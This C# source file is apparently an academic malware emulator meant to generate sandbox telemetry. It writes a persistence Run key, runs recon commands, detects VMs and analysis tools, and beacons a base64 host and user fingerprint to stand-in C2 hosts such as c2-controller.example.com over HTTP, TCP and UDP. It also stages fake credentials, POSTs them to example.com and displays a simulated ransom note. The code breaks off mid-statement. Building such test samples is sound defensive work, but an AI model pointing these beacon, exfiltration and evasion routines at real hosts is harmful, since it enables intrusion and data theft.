/*
 * IsoLens Malware Emulator — Academic Behavioral Testing Sample
 * ==============================================================
 * A HARMLESS executable that mimics common malware behaviors so that
 * sandbox monitoring tools (Sysmon, Procmon, handle, tcpvcon, etc.)
 * can capture realistic telemetry.
 *
 * Compile:  csc /out:malware_emulator.exe malware_emulator.cs
 * Run:      Double-click malware_emulator.exe (or run from CLI)
 *
 * Simulated behaviors:
 *   Phase 1 – File System     : drop files, read sensitive dirs, hidden files
 *   Phase 2 – Registry        : write Run key (persistence), then clean up
 *   Phase 3 – Network & C2    : DNS lookups, DGA domains, C2 beacon heartbeat,
 *                                HTTP POST check-in, TCP to C2 ports, DNS TXT C2
 *   Phase 4 – Process Spawn   : cmd, powershell, whoami, ipconfig, netstat…
 *   Phase 5 – Evasion         : VM detection, sandbox hostname check, uptime
 *   Phase 6 – Exfiltration    : base64-encode fake creds, POST them out
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace IsoLens
{
    class MalwareEmulator
    {
        // ── Paths ──────────────────────────────────────────────────
        static readonly string WorkDir  = Path.Combine(Path.GetTempPath(), "isolens_emulator");
        static readonly string LogFile  = Path.Combine(WorkDir, "emulator_log.txt");
        static readonly string JsonFile = Path.Combine(WorkDir, "emulator_results.json");

        static StreamWriter logWriter;
        static List<string> jsonEntries = new List<string>();

        // ── Win32 ──────────────────────────────────────────────────
        [DllImport("kernel32.dll")]
        static extern ulong GetTickCount64();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
        const uint FILE_ATTRIBUTE_HIDDEN = 0x02;

        // ═══════════════════════════════════════════════════════════
        // Logging helpers
        // ═══════════════════════════════════════════════════════════

        static void Log(string msg)
        {
            string line = string.Format("[{0}] {1}", DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"), msg);
            Console.WriteLine(line);
            if (logWriter != null)
            {
                logWriter.WriteLine(line);
                logWriter.Flush();
            }
        }

        static void Record(string category, string action, string detail, bool success = true)
        {
            string level = success ? "INFO" : "WARN";
            Log(string.Format("{0} [{1}] {2} — {3}", level, category, action, detail));

            // Build a JSON object (manual, no dependencies)
            string entry = string.Format(
                "    {{\"category\":\"{0}\",\"action\":\"{1}\",\"detail\":\"{2}\",\"success\":{3},\"timestamp\":\"{4}\"}}",
                Escape(category), Escape(action), Escape(detail),
                success ? "true" : "false",
                DateTime.Now.ToString("o"));
            jsonEntries.Add(entry);
        }

        static string Escape(string s)
        {
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 1 — FILE SYSTEM OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseFileSystem()
        {
            Log("");
            Log("═══ PHASE 1: File System Operations ═══");

            // 1a – Drop a fake PE payload in temp
            try
            {
                string payloadPath = Path.Combine(WorkDir, "dropped_payload.bin");
                byte[] data = new byte[512];
                data[0] = 0x4D; data[1] = 0x5A; // MZ header
                new Random().NextBytes(data);
                data[0] = 0x4D; data[1] = 0x5A;
                File.WriteAllBytes(payloadPath, data);
                Record("filesystem", "drop_payload", "Wrote fake PE stub to " + payloadPath);
            }
            catch (Exception e) { Record("filesystem", "drop_payload", e.Message, false); }

            // 1b – Create a hidden config file
            try
            {
                string hiddenPath = Path.Combine(WorkDir, ".hidden_c2_config.dat");
                File.WriteAllText(hiddenPath,
                    "c2_server=evil.example.com\r\ninterval=30\r\nprotocol=https\r\n");
                SetFileAttributes(hiddenPath, FILE_ATTRIBUTE_HIDDEN);
                Record("filesystem", "create_hidden_file", "Hidden C2 config at " + hiddenPath);
            }
            catch (Exception e) { Record("filesystem", "create_hidden_file", e.Message, false); }

            // 1c – Read sensitive directories
            string[] sensitivePaths = new string[] {
                Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\Desktop"),
                Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\Documents"),
                Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Windows\Recent"),
                Environment.ExpandEnvironmentVariables(@"%SYSTEMROOT%\System32\config"),
                Environment.ExpandEnvironmentVariables(@"%APPDATA%\Microsoft\Credentials"),
            };
            foreach (string p in sensitivePaths)
            {
                try
                {
                    string[] entries = Directory.GetFileSystemEntries(p);
                    Record("filesystem", "read_sensitive_dir",
                        string.Format("{0} -> {1} entries", p, entries.Length));
                }
                catch (Exception e)
                {
                    Record("filesystem", "read_sensitive_dir",
                        string.Format("{0} -> {1}", p, e.Message), false);
                }
            }

            // 1d – Write a batch dropper script
            try
            {
                string batPath = Path.Combine(WorkDir, "update_service.bat");
                File.WriteAllText(batPath,
                    "@echo off\r\n" +
                    "echo [*] Emulated dropper running...\r\n" +
                    "whoami\r\n" +
                    "ipconfig /all\r\n" +
                    "netstat -ano\r\n");
                Record("filesystem", "write_batch_dropper", "Batch dropper at " + batPath);
            }
            catch (Exception e) { Record("filesystem", "write_batch_dropper", e.Message, false); }

            // 1e – Create an encrypted exfil staging area
            try
            {
                string staging = Path.Combine(WorkDir, "staging", "exfil");
                Directory.CreateDirectory(staging);
                Random rng = new Random();
                for (int i = 0; i < 5; i++)
                {
                    byte[] chunk = new byte[1024];
                    rng.NextBytes(chunk);
                    File.WriteAllBytes(Path.Combine(staging, string.Format("chunk_{0:D3}.enc", i)), chunk);
                }
                Record("filesystem", "create_staging_dir",
                    "Staging area with 5 encrypted chunks at " + staging);
            }
            catch (Exception e) { Record("filesystem", "create_staging_dir", e.Message, false); }

            // 1f – Copy self to a persistence location
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                string copyPath = Path.Combine(WorkDir, "svchost_update.exe");
                File.Copy(selfPath, copyPath, true);
                Record("filesystem", "self_copy",
                    "Copied self to " + copyPath + " (mimicking persistence dropper)");
            }
            catch (Exception e) { Record("filesystem", "self_copy", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 2 — REGISTRY OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseRegistry()
        {
            Log("");
            Log("═══ PHASE 2: Registry Operations ═══");

            string keyPath   = @"Software\Microsoft\Windows\CurrentVersion\Run";
            string valueName = "IsoLensEmulatorTest";
            string valueData = Path.Combine(WorkDir, "svchost_update.exe");

            // 2a – Write a Run key for persistence
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    key.SetValue(valueName, valueData, RegistryValueKind.String);
                }
                Record("registry", "write_run_key",
                    string.Format(@"HKCU\{0}\{1} = {2}", keyPath, valueName, valueData));
            }
            catch (Exception e) { Record("registry", "write_run_key", e.Message, false); }

            // 2b – Read it back to confirm
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath))
                {
                    object val = key.GetValue(valueName);
                    Record("registry", "read_run_key", "Read back: " + val);
                }
            }
            catch (Exception e) { Record("registry", "read_run_key", e.Message, false); }

            // 2c – Query interesting registry locations
            string[] regQueries = new string[] {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
            };
            foreach (string rp in regQueries)
            {
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(rp))
                    {
                        int count = key != null ? key.SubKeyCount : 0;
                        Record("registry", "query_key",
                            string.Format(@"HKLM\{0} -> {1} subkeys", rp, count));
                    }
                }
                catch (Exception e)
                {
                    Record("registry", "query_key",
                        string.Format(@"HKLM\{0} -> {1}", rp, e.Message), false);
                }
            }

            // 2d – Clean up the Run key
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    key.DeleteValue(valueName, false);
                }
                Record("registry", "cleanup_run_key", "Deleted emulator persistence key");
            }
            catch (Exception e) { Record("registry", "cleanup_run_key", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 3 — NETWORK OPERATIONS
        // ═══════════════════════════════════════════════════════════

        static void PhaseNetwork()
        {
            Log("");
            Log("═══ PHASE 3: Network Operations ═══");

            // 3a – DNS resolution (benign-looking targets)
            string[] targets = { "example.com", "example.org", "dns.google", "cloudflare.com" };
            foreach (string host in targets)
            {
                try
                {
                    IPAddress[] ips = Dns.GetHostAddresses(host);
                    Record("network", "dns_resolve",
                        string.Format("{0} -> {1}", host, ips[0]));
                }
                catch (Exception e)
                {
                    Record("network", "dns_resolve",
                        string.Format("{0} -> {1}", host, e.Message), false);
                }
            }

            // 3b – DGA-style DNS lookups (Domain Generation Algorithm)
            //       Real malware generates random-looking domains to find C2 servers.
            //       These will all fail on the isolated VM but Sysmon captures the DNS attempts.
            Log("  [*] Simulating DGA domain lookups...");
            string[] dgaDomains = {
                "xk7rvm2q.malware-c2.example.net",
                "b9f3az1p.botnet-ctrl.example.org",
                "qw4tn8dj.payload-drop.example.com",
                "m2xp7kv5.exfil-gate.example.net",
                "h6ys9b3w.c2-beacon.example.org",
            };
            foreach (string domain in dgaDomains)
            {
                try
                {
                    IPAddress[] ips = Dns.GetHostAddresses(domain);
                    Record("network", "dga_dns_lookup",
                        string.Format("DGA domain {0} -> {1}", domain, ips[0]));
                }
                catch (Exception e)
                {
                    Record("network", "dga_dns_lookup",
                        string.Format("DGA domain {0} -> {1} (expected on isolated VM)", domain, e.Message), false);
                }
            }

            // 3c – HTTP GET (simulated C2 beacon)
            string[] urls = { "http://example.com", "http://example.org" };
            foreach (string url in urls)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                    req.UserAgent = "IsoLens-Emulator/1.0 (Sandbox Test)";
                    req.Timeout = 10000;
                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    {
                        using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
                        {
                            string body = sr.ReadToEnd();
                            Record("network", "http_get",
                                string.Format("{0} -> HTTP {1}, {2} bytes",
                                    url, (int)resp.StatusCode, body.Length));
                        }
                    }
                }
                catch (Exception e)
                {
                    Record("network", "http_get",
                        string.Format("{0} -> {1}", url, e.Message), false);
                }
            }

            // ──────────────────────────────────────────────────────
            // 3d – C2 BEACON HEARTBEAT (Command & Control simulation)
            //       Malware typically "phones home" at regular intervals
            //       with encoded system fingerprint data.
            // ──────────────────────────────────────────────────────
            Log("  [*] Simulating C2 beacon heartbeat...");

            // Build a system fingerprint (what real malware sends to C2)
            string fingerprint = string.Format(
                "{{\"host\":\"{0}\",\"user\":\"{1}\",\"os\":\"{2}\",\"arch\":\"{3}\",\"pid\":{4},\"uptime_ms\":{5}}}",
                Escape(Environment.MachineName),
                Escape(Environment.UserName),
                Escape(Environment.OSVersion.ToString()),
                Environment.Is64BitOperatingSystem ? "x64" : "x86",
                Process.GetCurrentProcess().Id,
                GetTickCount64());

            string encodedFingerprint = Convert.ToBase64String(
                Encoding.UTF8.GetBytes(fingerprint));

            Record("network", "c2_build_fingerprint",
                string.Format("System fingerprint built ({0} bytes, base64: {1} chars)",
                    fingerprint.Length, encodedFingerprint.Length));

            // Beacon attempt 1 – HTTP POST check-in to C2 server
            string[] c2Urls = {
                "http://c2-controller.example.com:8080/api/beacon",
                "http://malware-cnc.example.net:443/gate.php",
                "http://update-service.example.org:8443/checkin",
            };
            foreach (string c2Url in c2Urls)
            {
                try
                {
                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(c2Url);
                    req.Method = "POST";
                    req.ContentType = "application/json";
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
                    req.Timeout = 5000;
                    req.Headers.Add("X-Session-ID", Guid.NewGuid().ToString("N"));
                    req.Headers.Add("X-Bot-ID", "ISOLENS-" + Environment.MachineName);
                    byte[] postData = Encoding.UTF8.GetBytes(
                        string.Format("{{\"type\":\"checkin\",\"data\":\"{0}\"}}", encodedFingerprint));
                    req.ContentLength = postData.Length;
                    using (Stream s = req.GetRequestStream()) { s.Write(postData, 0, postData.Length); }
                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                    {
                        Record("network", "c2_beacon_checkin",
                            string.Format("C2 check-in to {0} -> HTTP {1}", c2Url, (int)resp.StatusCode));
                    }
                }
                catch (Exception e)
                {
                    Record("network", "c2_beacon_checkin",
                        string.Format("C2 check-in to {0} -> {1} (expected on isolated VM)", c2Url, e.Message), false);
                }
            }

            // Beacon attempt 2 – Raw TCP to non-standard C2 ports
            //   Real C2 frameworks (Cobalt Strike, Metasploit) often use 4444, 8443, 9090
            Log("  [*] Attempting raw TCP connections to C2 ports...");
            string[][] c2TcpTargets = new string[][] {
                new string[] { "c2-controller.example.com", "4444" },   // Metasploit default
                new string[] { "malware-cnc.example.net",   "8443" },   // HTTPS alt / C2
                new string[] { "evil-proxy.example.org",    "1337" },   // Custom C2
                new string[] { "update-service.example.com","9999" },   // Backdoor port
            };
            foreach (string[] target in c2TcpTargets)
            {
                try
                {
                    using (TcpClient tcp = new TcpClient())
                    {
                        tcp.SendTimeout = 3000;
                        tcp.ReceiveTimeout = 3000;
                        IAsyncResult ar = tcp.BeginConnect(target[0], int.Parse(target[1]), null, null);
                        bool connected = ar.AsyncWaitHandle.WaitOne(3000, false);
                        if (connected && tcp.Connected)
                        {
                            // Send an encoded beacon payload
                            NetworkStream ns = tcp.GetStream();
                            byte[] beacon = Encoding.ASCII.GetBytes(
                                "ISOLENS|BEACON|" + encodedFingerprint.Substring(0, Math.Min(64, encodedFingerprint.Length)) + "\n");
                            ns.Write(beacon, 0, beacon.Length);
                            Record("network", "c2_tcp_connect",
                                string.Format("TCP C2 beacon sent to {0}:{1}", target[0], target[1]));
                        }
                        else
                        {
                            Record("network", "c2_tcp_connect",
                                string.Format("TCP to {0}:{1} -> connection timed out (expected)", target[0], target[1]), false);
                        }
                    }
                }
                catch (Exception e)
                {
                    Record("network", "c2_tcp_connect",
                        string.Format("TCP to {0}:{1} -> {2}", target[0], target[1], e.Message), false);
                }
            }

            // Beacon attempt 3 – DNS TXT record query (C2 over DNS)
            //   Advanced malware uses DNS TXT records to receive commands.
            //   We simulate this with nslookup queries.
            Log("  [*] Simulating DNS-based C2 command channel...");
            string[] dnsTxtDomains = {
                "cmd.c2-dns.example.com",
                "task.botnet-dns.example.net",
            };
            foreach (string domain in dnsTxtDomains)
            {
                try
                {
                    string result = RunCmd("nslookup", string.Format("-type=TXT {0}", domain), 5000);
                    Record("network", "c2_dns_txt_query",
                        string.Format("DNS TXT query for {0} -> {1}", domain,
                            result.Length > 200 ? result.Substring(0, 200) + "..." : result));
                }
                catch (Exception e)
                {
                    Record("network", "c2_dns_txt_query",
                        string.Format("DNS TXT query for {0} -> {1}", domain, e.Message), false);
                }
            }

            // 3e – Simulated beacon sleep cycle (heartbeat interval)
            Log("  [*] Simulating C2 beacon sleep cycle (3 heartbeats)...");
            for (int i = 1; i <= 3; i++)
            {
                Record("network", "c2_heartbeat",
                    string.Format("Heartbeat #{0}/3 — sleeping 2s before next beacon", i));
                Thread.Sleep(2000);

                // Each heartbeat tries a different method
                try
                {
                    using (UdpClient udp = new UdpClient())
                    {
                        string heartbeatPayload = string.Format(
                            "ISOLENS|HB|{0}|{1}|{2}",
                            i, Environment.MachineName, DateTime.UtcNow.ToString("o"));
                        byte[] payload = Encoding.ASCII.GetBytes(heartbeatPayload);
                        udp.Send(payload, payload.Length, "c2-controller.example.com", 53);
                        Record("network", "c2_udp_heartbeat",
                            string.Format("UDP heartbeat #{0} sent to c2-controller.example.com:53 ({1} bytes)",
                                i, payload.Length));
                    }
                }
                catch (Exception e)
                {
                    Record("network", "c2_udp_heartbeat",
                        string.Format("UDP heartbeat #{0} -> {1}", i, e.Message), false);
                }
            }

            // 3f – Raw TCP socket (simulated reverse-shell connect)
            try
            {
                using (TcpClient tcp = new TcpClient())
                {
                    tcp.SendTimeout = 5000;
                    tcp.ReceiveTimeout = 5000;
                    tcp.Connect("example.com", 80);
                    NetworkStream ns = tcp.GetStream();
                    byte[] req = Encoding.ASCII.GetBytes("GET / HTTP/1.0\r\nHost: example.com\r\n\r\n");
                    ns.Write(req, 0, req.Length);
                    byte[] buf = new byte[1024];
                    int n = ns.Read(buf, 0, buf.Length);
                    Record("network", "raw_tcp_socket",
                        string.Format("TCP to example.com:80 -> {0} bytes received", n));
                }
            }
            catch (Exception e) { Record("network", "raw_tcp_socket", e.Message, false); }

            // 3g – UDP packet (DNS-style, to a safe target)
            try
            {
                using (UdpClient udp = new UdpClient())
                {
                    byte[] payload = Encoding.ASCII.GetBytes("ISOLENS_BEACON_TEST");
                    udp.Send(payload, payload.Length, "example.com", 53);
                    Record("network", "udp_send", "UDP beacon sent to example.com:53");
                }
            }
            catch (Exception e) { Record("network", "udp_send", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 4 — PROCESS SPAWNING
        // ═══════════════════════════════════════════════════════════

        static string RunCmd(string fileName, string arguments, int timeoutMs = 15000)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = fileName,
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                using (Process proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit(timeoutMs);
                    string output = (stdout + " " + stderr).Trim();
                    if (output.Length > 400) output = output.Substring(0, 400) + "...";
                    return string.Format("exit {0}: {1}", proc.ExitCode, output);
                }
            }
            catch (Exception e)
            {
                return "ERROR: " + e.Message;
            }
        }

        static void PhaseProcesses()
        {
            Log("");
            Log("═══ PHASE 4: Process Spawning ═══");

            // 4a – System reconnaissance (classic first-stage recon)
            string[][] recon = new string[][] {
                new string[] {"whoami", ""},
                new string[] {"hostname", ""},
                new string[] {"ipconfig", "/all"},
                new string[] {"netstat", "-ano"},
                new string[] {"systeminfo", ""},
                new string[] {"tasklist", ""},
                new string[] {"net", "user"},
                new string[] {"net", "localgroup administrators"},
                new string[] {"arp", "-a"},
                new string[] {"route", "print"},
            };
            foreach (string[] cmd in recon)
            {
                string result = RunCmd(cmd[0], cmd[1]);
                Record("process", cmd[0] + (cmd[1].Length > 0 ? "_" + cmd[1].Replace(" ", "").Replace("/","").Replace("-","") : ""),
                    result);
            }

            // 4b – PowerShell execution
            Record("process", "powershell_start", "Launching PowerShell commands...");

            string psResult1 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"Get-Process | Select-Object -First 15 Name,Id,CPU | Format-Table -AutoSize\"");
            Record("process", "powershell_get_process", psResult1);

            string psResult2 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Select-Object -First 10 | Format-Table -AutoSize\"");
            Record("process", "powershell_net_connections", psResult2);

            string psResult3 = RunCmd("powershell.exe",
                "-NoProfile -NonInteractive -Command \"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('IsoLens beacon test'))\"");
            Record("process", "powershell_base64_encode", psResult3);

            // 4c – cmd /c chain
            string cmdResult = RunCmd("cmd.exe",
                "/c \"echo %USERNAME% on %COMPUTERNAME% at %DATE% %TIME%\"");
            Record("process", "cmd_env_dump", cmdResult);

            // 4d – Execute the batch dropper
            string batPath = Path.Combine(WorkDir, "update_service.bat");
            if (File.Exists(batPath))
            {
                string batResult = RunCmd("cmd.exe", "/c \"" + batPath + "\"");
                Record("process", "execute_batch_dropper", batResult);
            }

            // 4e – wmic queries
            string wmicResult = RunCmd("wmic", "process list brief");
            Record("process", "wmic_process_list", wmicResult);

            // 4f – schtasks query
            string schtResult = RunCmd("schtasks", "/query /fo LIST");
            Record("process", "schtasks_query", schtResult);
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 5 — EVASION & ENVIRONMENT FINGERPRINTING
        // ═══════════════════════════════════════════════════════════

        static void PhaseEvasion()
        {
            Log("");
            Log("═══ PHASE 5: Evasion & Environment Fingerprinting ═══");

            // 5a – Check for VM artifacts
            string[] vmFiles = {
                @"C:\Windows\System32\VBoxService.exe",
                @"C:\Windows\System32\VBoxTray.exe",
                @"C:\Windows\System32\vmtoolsd.exe",
                @"C:\Windows\System32\drivers\vboxguest.sys",
                @"C:\Windows\System32\drivers\vmhgfs.sys",
            };
            int vmFound = 0;
            foreach (string p in vmFiles)
            {
                bool exists = File.Exists(p);
                if (exists) vmFound++;
                Record("evasion", "vm_artifact_check",
                    string.Format("{0} -> {1}", p, exists ? "FOUND" : "not found"));
            }
            if (vmFound > 0)
                Record("evasion", "vm_detected",
                    string.Format("VM environment detected via {0} artifacts — real malware would EXIT here", vmFound));

            // 5b – Check hostname for sandbox keywords
            string hostname = Environment.MachineName.ToLower();
            string[] sandboxNames = { "sandbox", "malware", "virus", "analysis", "cuckoo", "sample", "test" };
            bool nameFound = false;
            foreach (string kw in sandboxNames)
            {
                if (hostname.Contains(kw))
                {
                    Record("evasion", "hostname_check",
                        string.Format("Suspicious keyword '{0}' in hostname '{1}'", kw, hostname));
                    nameFound = true;
                    break;
                }
            }
            if (!nameFound)
                Record("evasion", "hostname_check",
                    string.Format("Hostname '{0}' — no sandbox keywords detected", hostname));

            // 5c – Uptime check
            try
            {
                ulong ms = GetTickCount64();
                double min = ms / 60000.0;
                Record("evasion", "uptime_check",
                    string.Format("System uptime: {0:F1} minutes (malware often waits if < 10 min)", min));
            }
            catch { Record("evasion", "uptime_check", "Could not determine uptime", false); }

            // 5d – Process count
            try
            {
                int count = Process.GetProcesses().Length;
                Record("evasion", "process_count",
                    string.Format("{0} running processes (low count may indicate sandbox)", count));
            }
            catch (Exception e) { Record("evasion", "process_count", e.Message, false); }

            // 5e – Check for analysis tools running
            string[] analysisTools = { "procmon", "procmon64", "wireshark", "fiddler", "processhacker",
                                       "x64dbg", "x32dbg", "ollydbg", "ida", "ida64", "sysmon", "sysmon64" };
            foreach (string tool in analysisTools)
            {
                try
                {
                    Process[] procs = Process.GetProcessesByName(tool);
                    if (procs.Length > 0)
                        Record("evasion", "analysis_tool_detected",
                            string.Format("{0} is running (PID {1}) — real malware would alter behavior", tool, procs[0].Id));
                }
                catch { }
            }

            // 5f – Small delay (anti-sandbox timing check)
            Record("evasion", "timing_delay", "Sleeping 2 seconds (simulating sandbox-aware delay)...");
            Thread.Sleep(2000);
            Record("evasion", "timing_delay", "Resumed after delay");
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 6 — DATA EXFILTRATION SIMULATION
        // ═══════════════════════════════════════════════════════════

        static void PhaseExfiltration()
        {
            Log("");
            Log("═══ PHASE 6: Data Exfiltration Simulation ═══");

            // 6a – Harvest fake credentials
            string fakeCreds =
                "{\"browser\":\"TestBrowser\"," +
                "\"entries\":[" +
                "{\"url\":\"https://bank.example.com\",\"user\":\"victim\",\"pass\":\"P@ssw0rd123!\"}," +
                "{\"url\":\"https://mail.example.com\",\"user\":\"target\",\"pass\":\"S3cr3t!!\"}" +
                "]}";

            // 6b – Base64 encode
            string blob = Convert.ToBase64String(Encoding.UTF8.GetBytes(fakeCreds));
            string exfilPath = Path.Combine(WorkDir, "staging", "exfil", "creds.b64");
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(exfilPath));
                File.WriteAllText(exfilPath, blob);
                Record("exfiltration", "encode_credentials",
                    string.Format("Base64 credential blob ({0} chars) -> {1}", blob.Length, exfilPath));
            }
            catch (Exception e) { Record("exfiltration", "encode_credentials", e.Message, false); }

            // 6c – "Exfiltrate" via HTTP POST to example.com
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://example.com");
                req.Method = "POST";
                req.ContentType = "application/octet-stream";
                req.UserAgent = "IsoLens-Emulator/1.0";
                req.Timeout = 10000;
                byte[] postData = Encoding.UTF8.GetBytes(blob.Substring(0, Math.Min(256, blob.Length)));
                req.ContentLength = postData.Length;
                using (Stream s = req.GetRequestStream()) { s.Write(postData, 0, postData.Length); }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                {
                    Record("exfiltration", "http_exfil",
                        string.Format("POST to example.com -> HTTP {0}", (int)resp.StatusCode));
                }
            }
            catch (WebException e)
            {
                if (e.Response != null)
                {
                    int code = (int)((HttpWebResponse)e.Response).StatusCode;
                    Record("exfiltration", "http_exfil",
                        string.Format("POST to example.com -> HTTP {0} (expected rejection)", code));
                }
                else
                    Record("exfiltration", "http_exfil", e.Message, false);
            }
            catch (Exception e) { Record("exfiltration", "http_exfil", e.Message, false); }

            // 6d – Collect environment variables (info stealer behavior)
            try
            {
                StringBuilder envDump = new StringBuilder();
                foreach (System.Collections.DictionaryEntry entry in Environment.GetEnvironmentVariables())
                {
                    envDump.AppendFormat("{0}={1}\r\n", entry.Key, entry.Value);
                }
                string envPath = Path.Combine(WorkDir, "staging", "exfil", "env_dump.txt");
                File.WriteAllText(envPath, envDump.ToString());
                Record("exfiltration", "env_dump",
                    string.Format("Dumped {0} environment variables to {1}", Environment.GetEnvironmentVariables().Count, envPath));
            }
            catch (Exception e) { Record("exfiltration", "env_dump", e.Message, false); }
        }

        // ═══════════════════════════════════════════════════════════
        // PHASE 7 — GUI TERMINAL & WINDOW ACTIVITY
        // ═══════════════════════════════════════════════════════════

        static void PhaseGUIActivity()
        {
            Log("");
            Log("═══ PHASE 7: GUI Terminal & Window Activity ═══");
            Log("Opening visible windows for screenshot capture...");

            // 7a – Write and execute a batch recon display (visible cmd window)
            try
            {
                string batPath = Path.Combine(WorkDir, "recon_display.bat");
                File.WriteAllText(batPath,
                    "@echo off\r\n" +
                    "color 0C\r\n" +
                    "title [MALWARE] System Reconnaissance\r\n" +
                    "echo.\r\n" +
                    "echo ==========================================\r\n" +
                    "echo    [!] COMMAND CENTER ACTIVE\r\n" +
                    "echo ==========================================\r\n" +
                    "echo.\r\n" +
                    "echo [*] System Information:\r\n" +
                    "echo     Hostname: %COMPUTERNAME%\r\n" +
                    "echo     User:     %USERNAME%\r\n" +
                    "echo     Domain:   %USERDOMAIN%\r\n" +
                    "echo     OS:       %OS%\r\n" +
                    "echo.\r\n" +
                    "echo [*] Network Configuration:\r\n" +
                    "ipconfig\r\n" +
                    "echo.\r\n" +
                    "echo [*] Active Connections:\r\n" +
                    "netstat -an\r\n" +
                    "echo.\r\n" +
                    "echo [*] ARP Table:\r\n" +
                    "arp -a\r\n" +
                    "echo.\r\n" +
                    "echo [*] Waiting for C2 instructions...\r\n" +
                    "pause >nul\r\n");
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/k \"" + batPath + "\"",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal,
                });
                Record("gui", "open_cmd_recon",
                    "Opened visible cmd.exe with system recon display");
            }
            catch (Exception e) { Record("gui", "open_cmd_recon", e.Message, false); }

            Thread.Sleep(1000);

            // 7b – Write and open a ransom note in Notepad
            try
            {
                string ransomNote = Path.Combine(WorkDir, "README_DECRYPT.txt");
                File.WriteAllText(ransomNote,
                    "\r\n" +
                    "  ╔═══════════════════════════════════════════════════════╗\r\n" +
                    "  ║   !!! YOUR FILES HAVE BEEN ENCRYPTED !!!             ║\r\n" +
                    "  ╚═══════════════════════════════════════════════════════╝\r\n" +
                    "\r\n" +
                    "  All your important documents, photos, databases,\r\n" +
                    "  and other files have been encrypted with military\r\n" +
                    "  grade AES-256-CBC + RSA-4096 encryption.\r\n" +
                    "\r\n" +
                    "  To recover your files you need our decryptor.\r\n" +
                    "\r\n" +
                    "  ┌──────────────────────────────────────────────────────┐\r\n" +
                    "  │  Send exactly 0.5 BTC to :                           │\r\n" +
                    "  │  bc1q_1sd2cxnj2_ssdsdsaL_asbasa_00000000000000       │\r\n" +
                    "  │                                                      │\r\n" +
                    "  │  Email proof to: decrypt@evil.example.com            │\r\n" +
                    "  │  Include your Personal ID below.                     │\r\n" +
                    "  └──────────────────────────────────────────────────────┘\r\n" +
                    "\r\n" +
                    "  Your Personal ID:\r\n" +
                    "    ISOLENS-EMU-" + Guid.NewGuid().ToString().ToUpper() + "\r\n" +
                    "\r\n" +
                    "  WARNING: Do NOT rename encrypted files.\r\n" +
                    "  WARNING: Do NOT use third-party decryption tools.\r\n" +
                    "  WARNING: Do NOT contact law enforcement.\r\n" +
                    "\r\n" +
                    "  You have 72 hours before the price doubles.\r\n" +
                    "  After 7 days, your files will be permanently lost.\r\n" +
                    "\r\n" +
                    "  ═══════════════════════════════════════════════════════\r\n" +
                    "    [IsoLens Academic Sandbox — Simulated Ransom Note]   \r\n" +
                    "  ═══════════════════════════════════════════════════════\r\n");
                Process.Start(new ProcessStartInfo
                {
                    FileName = "notepad.exe",
                    Arguments = ransomNote,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Normal,
                });
                Record("gui", "open_ransom_note",
                    "Opened ransom note in Notepad: " + ransomNote);
            }
            catch (Exception e) { Record("gui", "open_ransom_note", e.Message, false); }

            Thread.Sleep(1000);

            // 7c – Write and open a PowerShell C2 beacon display
            try
            {
                string psPath = Path.Combine(WorkDir, "c2_beacon.ps1");
                File.WriteAllText(psPath,
                    "$Host.UI.RawUI.WindowTitle = '[MALWARE] C2 Beacon'\r\n" +
                    "$Host.UI.RawUI.BackgroundColor = 'Black'\r\n" +
                    "$Host.UI.RawUI.ForegroundColor = 'Red'\r\n" +
                    "Clear-Host\r\n" +
                    "Write-Host ''\r\n" +
                    "Write-Host '  ╔══════════════════════════════════════════╗' -ForegroundColor Red\r\n" +
                    "Write-Host '  ║   BEACON ACTIVE - C2 CHANNEL OPEN       ║' -ForegroundColor Red\r\n" +
